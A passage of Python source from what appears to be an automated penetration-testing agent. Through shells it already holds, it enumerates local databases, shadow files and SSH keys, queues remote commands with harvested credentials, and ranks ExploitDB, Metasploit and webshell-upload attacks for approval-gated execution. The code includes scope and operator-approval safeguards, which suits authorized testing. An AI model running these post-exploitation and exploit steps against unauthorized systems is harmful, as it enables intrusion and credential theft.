    "mysql": {"ports": {3306}, "procs": ("mysql", "mariadb"), "cmds": [
        ("db_mysql", "Local MySQL/MariaDB databases + users",
         "mysql -u root -N -e 'SELECT version(); SHOW DATABASES; "
         "SELECT user,host FROM mysql.user;' 2>&1 | head -80")]},
    "postgres": {"ports": {5432}, "procs": ("postgres", "postmaster"), "cmds": [
        ("db_postgres", "Local PostgreSQL databases + roles",
         "(psql -U postgres -tAc 'SELECT version()' 2>&1; psql -U postgres -l 2>&1; "
         "psql -U postgres -tAc 'SELECT rolname FROM pg_roles' 2>&1) | head -80")]},
    "mongodb": {"ports": {27017}, "procs": ("mongod",), "cmds": [
        ("db_mongo", "Local MongoDB databases",
         "mongosh --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 "
         "|| mongo --quiet --eval 'printjson(db.adminCommand({listDatabases:1}))' 2>&1 | head -60")]},
    "redis": {"ports": {6379}, "procs": ("redis",), "cmds": [
        ("db_redis", "Local Redis info + keys",
         "(redis-cli INFO server 2>&1; redis-cli DBSIZE 2>&1; "
         "redis-cli --scan 2>&1 | head -20) | head -80")]},
    "memcached": {"ports": {11211}, "procs": ("memcached",), "cmds": [
        ("db_memcached", "Local memcached stats",
         "printf 'stats\\r\\nquit\\r\\n' | nc -w1 127.0.0.1 11211 2>&1 | head -40")]},
}


def _load_postex_commands():
    """Load post-ex command knowledge from knowledge/postex_commands.yaml, or the
    hardcoded fallbacks if it is unreadable.

    Returns (info_commands, local_db_probes) in the SAME shape the consumers
    already expect: info_commands is a list of (id, title, command) tuples;
    local_db_probes is {svc: {"ports": set[int], "procs": tuple[str],
    "cmds": [(id, title, command)]}}. The safe direction on any error is the
    fallback — post-ex enumeration keeps running its known checklist, never
    silently runs nothing."""
    import os as _os
    candidates = [
        _os.environ.get("POSTEX_COMMANDS_YAML", "/knowledge/postex_commands.yaml"),
        _os.path.join(_os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),
                      "knowledge", "postex_commands.yaml"),
    ]
    for path in candidates:
        if not path or not _os.path.exists(path):
            continue
        try:
            import yaml as _yaml
            with open(path, encoding="utf-8") as fh:
                data = _yaml.safe_load(fh) or {}
            info = [(c["id"], c.get("title", c["id"]), c["command"])
                    for c in (data.get("info_commands") or [])
                    if isinstance(c, dict) and c.get("id") and c.get("command")]
            probes = {}
            for svc, spec in (data.get("local_database_probes") or {}).items():
                if not isinstance(spec, dict):
                    continue
                probes[svc] = {
                    "ports": {int(p) for p in (spec.get("ports") or [])},
                    "procs": tuple(spec.get("procs") or []),
                    "cmds": [(c["id"], c.get("title", c["id"]), c["command"])
                             for c in (spec.get("commands") or [])
                             if isinstance(c, dict) and c.get("id") and c.get("command")],
                }
            if info and probes:
                return info, probes
            _log.warning("postex_commands.yaml %s parsed empty (info=%d probes=%d) "
                         "— using fallback", path, len(info), len(probes))
            break
        except Exception as e:  # noqa: BLE001
            _log.warning("postex_commands.yaml %s unreadable: %s — using fallback",
                         path, e)
            break
    else:
        _log.warning("postex_commands.yaml not found (looked in %s) — using fallback",
                     ", ".join(c for c in candidates if c))
    return _POSTEX_INFO_COMMANDS_FALLBACK, _LOCAL_DB_PROBES_FALLBACK


_POSTEX_INFO_COMMANDS, _LOCAL_DB_PROBES = _load_postex_commands()


def _loopback_db_services(listen_out):
    """DB service keys listening ONLY on loopback (127.x / ::1), from ss/netstat."""
    import re as _re
    found = {}
    for line in (listen_out or "").splitlines():
        line = _re.sub(r"^\S+@\S+:[^#]*#\s*", "", line).strip()
        parts = line.split()
        if len(parts) < 3 or not parts[0].isdigit() or ":" not in parts[2]:
            continue
        addr, _, ps = parts[2].rpartition(":")
        if not ps.isdigit():
            continue
        al = addr.strip().lower().strip("[]")
        if not (al.startswith("127.") or al in ("::1", "localhost")):
            continue
        port = int(ps)
        pm = _re.search(r'users:\(\("([^"]+)"', line)
        proc = (pm.group(1) if pm else "").lower()
        for svc, spec in _LOCAL_DB_PROBES.items():
            if port in spec["ports"] or any(t in proc for t in spec["procs"]):
                found[svc] = port
    return found


def _enumerate_local_databases(sid, target, steps):
    """Detection-triggered post-ex STEP: a database bound to loopback (127.x/::1)
    is unreachable from an external scan, but we hold a shell. Detect such DB
    ports in the listening-services output and, ONLY when one is present, run
    READ-ONLY local enumeration for it through the shell. Mirrors
    _harvest_shell_loot (a follow-up gated on what enumeration found). Returns
    {"dbs": [...], "ran": N}."""
    out = {"dbs": [], "ran": 0}
    try:
        listen = next((stp.get("output", "") for stp in (steps or [])
                       if stp.get("step") == "listen"), "")
        dbs = _loopback_db_services(listen)
        if not dbs:
            return out                       # detection: nothing local-only, no trigger
        out["dbs"] = sorted(dbs.keys())
        from etl import access as ax
        best = ax.best_for(target)
        if not best:
            out["reason"] = "local-only DB(s) detected but no live shell to reach them"
            return out
        for svc in dbs:
            for _sid_step, title, cmd in _LOCAL_DB_PROBES[svc]["cmds"]:
                res = ax.run(best, cmd)
                if res.get("ok"):
                    out["ran"] += 1
                _msg(sid, "PostEnumeration",
                     f"[local db · {title}] {cmd}\n{(res.get('output') or '')[:1200]}")
    except Exception as e:  # noqa: BLE001
        out["error"] = str(e)[:160]
        _log.debug("[%s] local-db enumeration failed: %s", sid, e)
    return out


def _enumerate_through_best_access(sid, target: str) -> dict:
    """Run the methodology's post-access checklist through the BEST shell we hold.

    Every exploit that succeeded left something behind, and running the
    checklist through all of them would be slow, noisy on the target, and would
    produce several partial answers to one question instead of one complete one.
    So the access is measured first — `id` for privilege, repeated probes for
    stability — and the checklist runs once, through the winner.

    A root shell that dies on the second command loses to a user shell that
    holds: the checklist is a SEQUENCE, and one that drops halfway through
    produces a half-finished enumeration that looks complete.

    Read-only steps only. `steps_for()` excludes mutating ones by default and
    this does not ask for them — running the checklist through access we already
    hold is enumeration; adding a backdoor while we are in there is not.
    """
    out = {"ran": 0, "failed": 0, "access": None, "steps": [], "reason": ""}
    try:
        from etl import access as ax
        from etl import playbooks as pb
    except Exception as e:  # noqa: BLE001
        out["reason"] = f"unavailable: {e}"
        return out

    try:
        measured = ax.refresh(target)
        best = ax.best_for(target)
    except Exception as e:  # noqa: BLE001
        out["reason"] = f"access measurement failed: {str(e)[:160]}"
        return out
    if not best:
        # Distinct from "nothing to enumerate": we looked for access and found
        # none that answered. The candidate count says whether that is because
        # there was nothing, or because nothing worked.
        out["reason"] = (f"no live access on {target} "
                         f"({measured.get('discovered', 0)} candidate(s) probed, "
                         f"{measured.get('live', 0)} answered)")
        return out

    out["access"] = {k: best[k] for k in ("kind", "handle", "whoami", "is_root",
                                          "score")}
    _msg(sid, "PostEnumeration",
         f"[access] Using {best['kind']} {best['handle']} "
         f"(whoami={best.get('whoami') or '?'}, root={best.get('is_root')}, "
         f"score={best['score']}) for post-enumeration — chosen from "
         f"{measured.get('discovered', 0)} candidate(s) by measured privilege "
         f"and stability.")

    seen_cmds = set()

    def _run_step(step_id, title, cmd):
        cmd = (cmd or "").strip()
        if not cmd or cmd in seen_cmds:
            return
        seen_cmds.add(cmd)
        res = ax.run(best, cmd)
        out["steps"].append({"step": step_id, "title": title, "command": cmd,
                             "ok": res["ok"], "output": (res["output"] or "")[:1200]})
        if res["ok"]:
            out["ran"] += 1
        else:
            out["failed"] += 1

    # HIGH-VALUE INFO GATHERING FIRST — the read-only commands most likely to
    # yield actionable info on ANY *nix shell (kind-agnostic: a bind/command/
    # meterpreter shell benefits from these, where the ssh playbook alone did
    # nothing for it). Ordered by payoff: identity, then privesc surface, then
    # secrets/pivot data. Read-only; NOTHING here mutates the target — "get more
    # info" is enumeration, not persistence. root-only reads (shadow) simply
    # return nothing on a user shell.
    for step_id, title, cmd in _POSTEX_INFO_COMMANDS:
        _run_step(step_id, title, cmd)

    # Then the methodology's own ssh post-access checklist (sudo rights,
    # authorized_keys, known_hosts, sshd_config), deduped against the above.
    for st in pb.steps_for("ssh", access="shell"):
        if st["access_required"] != "shell":
            continue
        for c in st["commands"]:
            cmd = (c.get("command") or "").strip()
            if not cmd or "{" in cmd:
                continue
            _run_step(st["id"], st["title"], cmd)
    return out


def _enumerate_post_access(sid, target: str) -> dict:
    """Queue the methodology's post-access checks for services we can reach.

    Only where a working credential is actually held: a post-access step against
    a service nobody has access to is noise in the queue, and a queue that fills
    with noise stops being read.
    """
    out = {"queued": 0, "services": [], "steps": 0, "reason": ""}
    try:
        import psycopg2
        from etl import playbooks as pb
        from etl.credential_followups import queue_followups  # noqa: F401
    except Exception as e:  # noqa: BLE001
        out["reason"] = f"unavailable: {e}"
        return out
    dsn = os.environ.get("DB_DSN") or os.environ.get("DATABASE_URL")
    if not dsn:
        out["reason"] = "no DB_DSN"
        return out
    try:
        with psycopg2.connect(dsn, connect_timeout=5) as conn, conn.cursor() as cur:
            params = [target] if target else []
            cur.execute(
                """
                SELECT DISTINCT ON (protocol, host(ip), port)
                       protocol, host(ip)::text, port, id::text
                  FROM credential_findings
                 WHERE valid_cred = true
                   AND status IN ('valid', 'unknown')
                """ + ("   AND host(ip) = %s" if target else "") + """
                 ORDER BY protocol, host(ip), port, created_at DESC
                """,
                params)
            creds = cur.fetchall()
            if not creds:
                out["reason"] = "no working credential is held for any service"
                return out

            from psycopg2.extras import Json
            for protocol, ip, port, cred_id in creds:
                steps = pb.steps_for(protocol or "", access="shell")
                post = [s for s in steps if s["access_required"] == "shell"]
                if not post:
                    continue
                if protocol not in out["services"]:
                    out["services"].append(protocol)
                out["steps"] += len(post)
                for st in post:
                    for c in st["commands"]:
                        rendered = pb.render(c.get("command", ""), target=ip,
                                             port=port, service=protocol)
                        if rendered["unresolved"]:
                            continue
                        # WRAP IT FOR REMOTE EXECUTION.
                        #
                        # A playbook post-access step is written for someone who
                        # is already on the host: `sudo -l`, `cat ~/.ssh/id_rsa`.
                        # Queued verbatim they name `sudo` and `cat` as the tool,
                        # which the listener refuses — work that looks queued and
                        # can never run, the same defect the credential
                        # follow-ups had.
                        wrapped = _wrap_remote(protocol, ip, port,
                                               rendered["command"])
                        if not wrapped:
                            # No way to reach this service with a credential.
                            # Skipping is right; queueing something unrunnable
                            # is not.
                            out.setdefault("unwrappable", []).append(
                                {"protocol": protocol, "step": st["id"]})
                            continue
                        rendered["command"] = wrapped
                        cur.execute(
                            """
                            INSERT INTO scan_recommendations
                                (ip, service, scanner, action, script, source,
                                 priority, status, extra)
                            VALUES (%s,%s,%s,%s,%s,'post_enumeration',30,'pending',%s)
                            ON CONFLICT (fingerprint) DO NOTHING
                            """,
                            (ip, protocol, rendered["command"].split()[0],
                             rendered["command"], rendered["command"],
                             Json({"playbook": st["playbook"],
                                   "playbook_step": st["id"],
                                   "title": st["title"],
                                   "phase": st["phase"],
                                   "source": st["source"],
                                   "credential_id": cred_id,
                                   "remote_command": c.get("command"),
                                   "queued_by": "post_enumeration"})))
                        if cur.rowcount:
                            out["queued"] += 1
            conn.commit()
    except Exception as e:  # noqa: BLE001
        out["reason"] = str(e)[:200]
    return out


def report(state: PentestState) -> dict:
    sid = state["session_id"]
    lines = "\n".join(f"  - {f}" for f in state.get("findings", []))
    decision = state.get("exploit_decision") or {}
    rpt = (f"LangGraph pentest session summary\n"
           f"Target: {state['target'][:200]}\n"
           f"Task: {state['task'][:200]}\n"
           f"auto_execute: {bool(state.get('auto_execute'))}   "
           f"exploit phase: {bool(state.get('exploit_phase'))}\n"
           + (f"operator exploit decision: approved={decision.get('approved')}\n"
              if decision else "")
           + f"Steps:\n{lines}")
    # Phase 3: attach the FULL engagement report (findings, evidence, severity)
    # from the real generator, not just this step list. Best-effort — the step
    # summary is the fallback so a generator hiccup never fails the session.
    full = None
    try:
        import report_generator
        r = report_generator.generate_full_report(target=state.get("target"),
                                                  format="markdown")
        if isinstance(r, str):
            full = r
        elif isinstance(r, dict):
            full = r.get("markdown") or r.get("report") or r.get("content")
    except Exception as e:  # noqa: BLE001
        _msg(sid, "Reporter", f"[full report unavailable, using summary: {e}]")
    final = full if (isinstance(full, str) and full.strip()) else rpt
    if full and final is not rpt:
        final = rpt + "\n\n" + "=" * 60 + "\n\n" + final   # summary header + full report
    _msg(sid, "Reporter", final[:6000])
    _emit("langgraph_phase_completed", sid, {"phase": "report",
                                             "full_report": bool(full)})
    return {"phase": "done", "report": final, "log": ["report: composed"]}


# ── surface-test phase ───────────────────────────────────────────────────────
# Analyze ONE operator-selected host's attack surface, generate custom tests,
# and prove which are exploitable. Two lanes: SAFE tests run autonomously (via
# the scope-gated /tools/execute), IMPACTFUL tests queue for the SAME human
# approval interrupt the exploit phase uses. Every test is persisted as a
# re-runnable security_tests row with pass/fail history.

# Classification: a test is SAFE iff its category is read-only AND its tool is a
# known non-destructive tool AND it is not sourced from an exploit. Anything else
# is IMPACTFUL. The sets are ast-readable so tests/test_langgraph_phases.py pins
# them. IMPACTFUL is the safe default — a category we do not recognise is gated.
_SAFE_CATEGORIES = {
    "version_probe", "nuclei_detect", "tls_check", "lfi_read", "sqli_detect",
    "dir_enum", "banner", "http_probe", "cert_check",
    # WSTG finding-driven SAFE detection probes (curl/nuclei/sslscan only). Each
    # confirms a specific web finding without changing data or running code;
    # anything that does is IMPACTFUL (rce/sqli_dump/cred_bruteforce/upload/…).
    "xss_detect", "ssti_detect", "ssrf_detect", "xxe_detect", "redirect_check",
    "header_check", "cookie_check", "cors_check", "error_check", "method_check",
    # Tier 2 WSTG probes (all read-only curl/nuclei/sslscan detections).
    "hsts_check", "crossdomain_check", "cloud_storage", "cache_check",
    "ssi_detect", "format_string", "hpp_detect", "session_var", "file_ext",
}
_IMPACTFUL_CATEGORIES = {
    "rce", "shell", "msf_exploit", "file_write", "upload", "cred_bruteforce",
    "dos", "sqli_dump", "deserialization", "webshell_upload", "edb_exploit", "idor",
}
# ExploitDB scripts to try per (product, version). Non-MSF exploit coverage.
_EDB_PER_SERVICE = int(os.environ.get("SURFACE_EDB_LIMIT", "3"))
# Read-only tools the safe lane may dispatch. The /tools/execute endpoint is the
# real authority (Metasploit excluded there); this is a conservative agent-side
# snapshot so a tool we do not list is treated as impactful (fails safe).
# MUST stay identical to the listener's `_SAFE_READONLY_TOOLS` — an agreement
# test (tests/test_safe_lane_tools.py) pins both to one table. sqlmap (--os-shell
# → RCE) and smbclient (upload) were removed: they are offensive with their own
# flags, so a test using them now classifies IMPACTFUL and takes the approval
# lane instead of running unapproved through /tools/execute.
_SAFE_TOOL_HINTS = {
    "curl", "wget", "httpx", "nuclei", "nikto", "whatweb", "wafw00f",
    "sslscan", "testssl.sh", "testssl", "sslyze",
    "gobuster", "feroxbuster", "ffuf", "dirb", "dirsearch",
    "nmap",
    "dig", "host", "nslookup", "dnsrecon", "dnsenum", "dnsx",
    "enum4linux", "enum4linux-ng", "smbmap", "nbtscan", "rpcclient",
    "snmpwalk", "snmpcheck", "onesixtyone", "ldapsearch", "ntpq",
    "avahi-browse", "smtp-user-enum",
    "ssh-audit",
    "showmount", "rmg",
}
# Cap per host — this is a single-host exhaustive sweep, not the cross-host
# _DETERMINISTIC_PLAN_LIMIT that bounds recommender calls across many hosts.
# Max surface tests generated for ONE host. Deliberately high: the operator asked
# to test EVERY recommendation, so this is a runaway backstop, not a curation cap.
# Candidates are priority-sorted (real exploits + webshell first) before it bites,
# so on a pathological host the highest-value tests are the ones that survive.
_SURFACE_TEST_LIMIT = int(os.environ.get("SURFACE_TEST_LIMIT", "300"))
# How many MSF modules per service become impactful tests. Was an inline [:2]
# that truncated real exploits; high now so all recommended modules get through.
_MSF_MODULE_LIMIT = int(os.environ.get("SURFACE_MSF_LIMIT", "12"))


def _exploitdb_tests(items: list) -> list:
    """Non-MSF exploit tests: search ExploitDB by (product, version) and emit an
    IMPACTFUL test per real EDB script found. These execute via the exploit-runner
    `source=exploitdb` path (the script is LLM-customised for the target, then
    run), complementing the MSF modules — so a service with a raw PoC but no MSF
    module still gets a proof attempt. The '(Metasploit)' EDB duplicates are
    skipped (the MSF path already covers those)."""
    import httpx as _hx
    base = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")
    key = os.environ.get("API_KEY", "changeme")
    out, seen_q, seen_edb = [], set(), set()
    for row in items:
        product = (row.get("product") or "").strip()
        version = (row.get("version") or "").strip()
        port, ip = row.get("port"), row.get("ip")
        svc = (row.get("service") or "").strip().lower()
        if not product or not ip:
            continue
        # The nmap version field is often junk (UnrealIRCd's is an admin email,
        # Samba's is "3.X - 4.X"), so search by product + a CLEAN version token
        # (e.g. 2.3.4) only when one is present, else product alone.
        import re as _re
        vm = _re.search(r"\d+\.\d+(?:\.\d+)?", version or "")
        q = f"{product} {vm.group(0)}".strip() if vm else product.strip()
        if q.lower() in seen_q:
            continue
        seen_q.add(q.lower())
        try:
            r = _hx.get(f"{base}/exploitdb/search",
                        params={"q": q, "limit": 8},
                        headers={"x-api-key": key}, verify=False, timeout=15)
            results = (r.json().get("results") or []) if r.status_code < 400 else []
        except Exception:  # noqa: BLE001
            results = []
        added = 0
        for it in results:
            if added >= _EDB_PER_SERVICE:
                break
            edb = str(it.get("edb_id") or it.get("id") or "").strip()
            title = str(it.get("title") or it.get("description") or "")
            if not edb or edb in seen_edb:
                continue
            # Skip the '(Metasploit)' EDB mirrors — the MSF path already runs those.
            if "metasploit" in title.lower():
                continue
            seen_edb.add(edb)
            added += 1
            out.append({
                "name": f"exploitdb EDB-{edb}: {title[:50]} @ {ip}:{port}",
                "host": ip, "service": svc or "?", "port": port, "tool": "exploitdb",
                "command": None, "category": "edb_exploit", "tier": "impactful",
                "assertion": {"expect_regex": "(?i)(uid=[0-9]|gid=[0-9]|shell|success|root@)"},
                "exploit_ref": {"source": "exploitdb", "dispatch_source": "exploitdb",
                                "exploit_type": "rce", "module": edb, "edb_id": edb,
                                "purpose": title[:120]},
            })
    return out


def _test_priority(t: dict) -> int:
    """Lower = kept first when capping. Real exploits and the webshell rank above
    active safe probes, which rank above passive version/banner probes, which
    rank above MSF auxiliary SCANNERS (version/login/enum — lowest value)."""
    cat = t.get("category")
    ref = t.get("exploit_ref") or {}
    mod = str(ref.get("module") or "")
    if cat == "webshell_upload":
        return 0
    if cat == "msf_exploit" and mod.startswith("exploit/"):
        return 1                                   # a shell — the whole point
    if cat == "edb_exploit":
        return 1                                   # non-MSF ExploitDB script — same value
    if t.get("tier") == "impactful":
        return 2                                   # wstg/synth impactful (rce, sqli_dump…)
    if cat in ("nuclei_detect", "dir_enum", "sqli_detect", "xss_detect", "lfi_read", "cmd_injection"):
        return 3                                   # active safe detection
    if cat == "msf_exploit":
        return 6                                   # auxiliary/ scanner — lowest
    return 4                                        # version_probe / banner / tls


# Platform inference from banners (nmap rarely fills assets.os on this lab).
# Strong, low-false-positive tokens only — "microsoft" is excluded because nmap
# labels a LINUX Samba port "microsoft-ds".
_LINUX_HINTS = ("linux", "ubuntu", "debian", "unix", "smbd", "telnetd",
                "openssh", "vsftpd", "proftpd", "distcc", "postfix",
                "centos", "redhat", "fedora", ".el")
_WINDOWS_HINTS = ("windows", "win32", "win64", "microsoft iis", "microsoft-iis")
# Which MSF module platforms are INCOMPATIBLE with a given target family. The
# module platform is the 2nd path segment: exploit/<platform>/<cat>/<name>.
_PLATFORM_MISMATCH = {
    "unix": {"windows", "osx", "apple_ios", "android", "mainframe"},
    "windows": {"linux", "unix", "osx", "apple_ios", "android", "bsd", "solaris"},
}


def _infer_target_platform(items) -> Optional[str]:
    """'unix' | 'windows' | None from the host's service banners/products/os.
    None (unknown) means DON'T filter — never drop a module on a guess."""
    blob = " ".join(
        f"{r.get('product') or ''} {r.get('banner') or ''} "
        f"{r.get('version') or ''} {r.get('os') or ''}"
        for r in (items or [])).lower()
    lin = sum(blob.count(h) for h in _LINUX_HINTS)
    win = sum(blob.count(h) for h in _WINDOWS_HINTS)
    if lin > win and lin:
        return "unix"
    if win > lin and win:
        return "windows"
    return None


def _module_platform(module) -> str:
    parts = str(module or "").lower().split("/")
    return parts[1] if len(parts) >= 2 else ""


def _platform_mismatch(module, target) -> bool:
    """True when this module's platform contradicts the target family — e.g. a
    windows/smb exploit against a Linux Samba host. Unknown target or platform
    never mismatches (fail-open: we only drop a PROVEN wrong-OS module)."""
    if not target:
        return False
    return _module_platform(module) in _PLATFORM_MISMATCH.get(target, set())


def _rank_msf(mods, limit=None, platform=None):
    """Filter platform mismatches, then order real `exploit/` modules (which land
    a shell) ABOVE `auxiliary/` scanners (version/login/enum), then cap.

    The recommender lists scanners first, so a naive `[:2]` kept ftp_version +
    ftp_login and TRUNCATED OUT exploit/unix/ftp/vsftpd_234_backdoor — the actual
    RCE — at index 3. It also returns generic Windows SMB modules (ms17_010,
    ms08_067) for a Linux Samba port; `platform` drops those wrong-OS modules so
    the approval queue holds only what can actually land here."""
    def _mod(m):
        return str((m or {}).get("module") or (m or {}).get("name") or "")

    kept = [m for m in (mods or []) if not _platform_mismatch(_mod(m), platform)]

    def _rank(m):
        mod = _mod(m).lower()
        if mod.startswith("exploit/"):
            return 0
        if mod.startswith("auxiliary/"):
            return 2
        return 1
    return sorted(kept, key=_rank)[:(limit or _MSF_MODULE_LIMIT)]


@functools.lru_cache(maxsize=1)
def _load_readonly_msf_scanners() -> dict:
    """{module -> (category, safe_command_template)} from
    knowledge/msf_readonly_scanners.yaml — the DATA that says which MSF auxiliary
    scanners are purely read-only and how to run each without Metasploit.

    Knowledge is RAG-first (CLAUDE.md): this classification is a knowledge file
    (embedded into rag_documents by etl/load_knowledge_documents.py), not a
    hardcoded branch, so reclassifying a module is a YAML edit, not a code change.
    The file is bind-mounted, so edits take effect on the next process start.
    Fail-safe: any error returns {} → every module stays IMPACTFUL through MSF."""
    import os as _os
    candidates = [
        _os.environ.get("MSF_READONLY_SCANNERS_YAML", "/knowledge/msf_readonly_scanners.yaml"),
        _os.path.join(_os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),
                      "knowledge", "msf_readonly_scanners.yaml"),
    ]
    for path in candidates:
        if not path or not _os.path.exists(path):
            continue
        try:
            import yaml as _yaml
            with open(path, encoding="utf-8") as fh:
                data = _yaml.safe_load(fh) or {}
            out = {}
            for row in (data.get("read_only_scanners") or []):
                if not isinstance(row, dict):
                    continue
                mod = str(row.get("module") or "").lower().strip()
                cat = row.get("category")
                cmd = row.get("safe_command")
                if mod and cat and cmd:
                    out[mod] = (cat, cmd)
            return out
        except Exception:  # noqa: BLE001 — fail-safe to no reclassification
            return {}
    return {}


def _safe_alt_for_msf(module, ip, port, scheme):
    """(category, command) if this MSF module is a PURELY READ-ONLY info scanner
    with a safe non-MSF equivalent, else None.

    A robots.txt fetch, a header/version grab, a cert read, a directory listing
    change nothing and run no code — so queuing them as IMPACTFUL metasploit
    tests (human approval + an MSF session) is wrong; the operator rightly
    expects a robots.txt fetch to just run with curl. These take the SAFE
    autonomous lane via their curl/sslscan/gobuster equivalent instead. The
    classification lives in knowledge/msf_readonly_scanners.yaml (data, not code);
    anything not listed there stays IMPACTFUL through MSF — fail-safe by omission."""
    entry = _load_readonly_msf_scanners().get(str(module or "").lower().strip())
    if not entry:
        return None
    category, template = entry
    command = template.format(scheme=scheme, ip=ip, port=port)
    return (category, command)
# How long surface_safe_exec polls one safe test for its terminal result. Must
# exceed run_custom_test's tool timeout (300s) so slow scanners (nuclei/gobuster)
# are captured instead of recorded as empty errors. Env-tunable.
_SAFE_TEST_POLL_SECONDS = int(os.environ.get("SAFE_TEST_POLL_SECONDS", "330"))
# Opt-in LLM synthesis in the surface phase: author a custom test per web finding
# instead of the fixed WSTG-map command. Bounded (one LLM call each) and it falls
# back to the deterministic map on any failure, so it never blocks the phase.
_SYNTH_TESTS_DEFAULT = os.environ.get("LANGGRAPH_SYNTH_TESTS", "").lower() in ("1", "true", "yes")
_SURFACE_SYNTH_LIMIT = int(os.environ.get("SURFACE_SYNTH_LIMIT", "8"))


def _synthesize_finding_test(finding: dict, guidance: str, ip, port):
    """Opt-in: LLM-author a custom test for one web finding, FAIL-SAFE classified
    (test_synth.synthesize re-classifies the synthesized command). Pulls an
    ExploitDB writeup too when the finding carries a CVE. Returns a candidate test
    dict, or None on ANY failure so the caller falls back to the fixed map.

    test_synth is imported lazily (it imports this module) — safe at call time,
    a cycle at module load."""
    try:
        import test_synth
        cwe = finding.get("cwe")
        cve = None
        if isinstance(cwe, list):
            cve = next((c for c in cwe if str(c).upper().startswith("CVE-")), None)
        elif str(cwe or "").upper().startswith("CVE-"):
            cve = cwe
        g = guidance or ""
        if cve:
            try:
                ed = json.loads(scan_tools.get_exploitdb_guidance(cve=cve))
                if ed.get("matched"):
                    g = (g + "\n\n=== ExploitDB ===\n" + (ed.get("guidance") or ""))[:8000]
            except Exception:  # noqa: BLE001
                pass
        out = test_synth.synthesize(finding, g)
        if not out.get("ok"):
            return None
        spec = out["spec"]
        cmd = spec.get("command")
        if not cmd:
            return None
        tier, cat = spec.get("tier"), spec.get("category")
        return {
            "name": f"AI:{cat} @ {finding.get('url') or finding.get('target')}",
            "host": ip, "service": "http", "port": port, "tool": _tool_head(cmd),
            "command": cmd, "category": cat, "tier": tier,
            "assertion": spec.get("assertion") or {},
            "exploit_ref": ({"source": "synth", "module": (spec.get("name") or "ai-test"),
                             "purpose": spec.get("rationale")} if tier == "impactful" else None),
        }
    except Exception:  # noqa: BLE001
        return None


def _host_of(raw) -> "str | None":
    """Normalize an attack-vector `target` (host, url, or 'svc on host') to a
    host/IP suitable for query_open_ports(target=)."""
    import re as _re
    raw = str(raw or "").strip()
    if not raw:
        return None
    m = _re.search(r"[0-9]{1,3}(?:\.[0-9]{1,3}){3}", raw)
    if m:
        return m.group(0)
    host = raw.split("//")[-1].split("/")[0].split(":")[0].strip()
    return host or None


def _tool_head(command: str) -> str:
    return (command or "").strip().split(" ", 1)[0].split("/")[-1].lower()


def _classify(category: str, command: str, has_exploit_ref: bool) -> str:
    """safe|impactful. SAFE requires all three: read-only category, allowlisted
    tool, no exploit source. Everything else is impactful (fails safe)."""
    if has_exploit_ref:
        return "impactful"
    if (category in _SAFE_CATEGORIES
            and _tool_head(command) in _SAFE_TOOL_HINTS):
        return "safe"
    return "impactful"


def _assertion_for(category: str, tls: str) -> dict:
    """A deterministic structured assertion per test category — the observable
    that proves the finding. Kept simple so record_test_run can evaluate it."""
    if category == "tls_check":
        return {"expect_exit_code": 0, "min_output_bytes": 40}
    if category == "lfi_read":
        return {"expect_substring": ["root:x:0:0"]}
    if category == "sqli_detect":
        return {"expect_regex": "(?i)injectable|parameter .* is vulnerable|syntax error"}
    if category == "nuclei_detect":
        return {"expect_regex": r"\[[a-z0-9-]+\]"}   # nuclei prints [template-id]
    if category in ("version_probe", "http_probe", "banner", "cert_check"):
        # A detection probe PASSES when it produced identifying output — the exit
        # code is not the signal. ssh-audit exits 3 when it FINDS weak crypto
        # (a successful probe, not a failure); testssl/sslscan and whatweb behave
        # similarly. Requiring exit 0 mislabelled a good 9.5 KB banner as "fail".
        return {"min_output_bytes": 20}
    if category == "dir_enum":
        return {"expect_regex": r"(?i)status: ?200|/[a-z0-9]"}
    return {"expect_exit_code": 0}


def _surface_categories_for(svc: str, tls: str) -> "list[tuple[str,str]]":
    """(category, tool) safe probes appropriate to a service. Deterministic; the
    concrete command comes from get_tool_recommendations where possible, else a
    sensible default here."""
    web = svc in _SERVICE_FAMILIES_WEB
    out = []
    if web:
        # whatweb, not ProjectDiscovery httpx: the kali image ships Python's
        # httpx at /usr/bin/httpx (different CLI, and not on the allowlist), so
        # an `httpx -title -tech-detect …` probe both 400s at the gate and would
        # not parse. whatweb is present, allowlisted, and gives title / server /
        # tech — exactly what http_probe asserts on.
        out += [("http_probe", "whatweb"), ("nuclei_detect", "nuclei"),
                ("dir_enum", "gobuster")]
        if tls == "yes":
            out += [("tls_check", "sslscan")]
    if svc in ("smb", "microsoft-ds", "netbios-ssn", "cifs"):
        out += [("version_probe", "enum4linux-ng")]
    if svc in ("ssh",):
        out += [("version_probe", "ssh-audit")]
    if svc in ("snmp",):
        out += [("version_probe", "snmpwalk")]
    if not out:
        out = [("banner", "nmap")]
    return out


# NSE script categories that are read-only/version-detection and safe to keep on
# a safe-lane nmap probe. Anything else (exploit, brute, dos, intrusive, or a
# service glob like `ftp-*` that pulls in ftp-vsftpd-backdoor) is stripped.
_SAFE_NSE_SCRIPTS = {"banner", "ssl-cert", "ssl-enum-ciphers", "http-title",
                     "http-headers", "http-server-header"}


def _bound_safe_command(cmd: str, ip, port) -> str:
    """Make a recommender-supplied command safe and bounded for the safe lane.

    The recommender emits aggressive nmap probes like
    `nmap -sV -sC -p 21 --script=ftp-*` for a "banner" test. `--script=ftp-*`
    pulls in exploit/brute NSE (ftp-vsftpd-backdoor et al.) — that both HANGS
    (seen: a 5-minute defunct nmap blocking the whole sequential safe lane) and
    crosses the safe/impactful line a safe test must not cross. Reduce any nmap
    command carrying `-sC`/`--script=` (unless the scripts are all in the safe
    allow-set) to a bounded version scan, and give every nmap probe a
    `--host-timeout` so one slow host cannot stall the lane.
    """
    head = _tool_head(cmd)
    if head != "nmap":
        return cmd
    import re as _re
    scripts = _re.findall(r"--script[= ]([^\s]+)", cmd)
    flat = ",".join(scripts)
    aggressive = ("-sC" in cmd.split()) or (
        flat and any(tok.strip() not in _SAFE_NSE_SCRIPTS
                     for tok in flat.split(",") if tok.strip()))
    if aggressive:
        # Rebuild as a plain, bounded version scan on the same port.
        return f"nmap -sV -Pn --host-timeout 120s -p {port} {ip}"
    if "--host-timeout" not in cmd:
        cmd = cmd.replace("nmap", "nmap --host-timeout 120s", 1)
    return cmd


# WSTG-CONF-06 — collections a PUT webshell is commonly accepted into. Kept
# permissive: a server that accepts PUT WITHOUT advertising it (Tomcat with
# readonly=false, a misconfigured upload dir, no DAV header at all) should still
# be attempted, because the gated PUT at execution is the real proof. Ordered
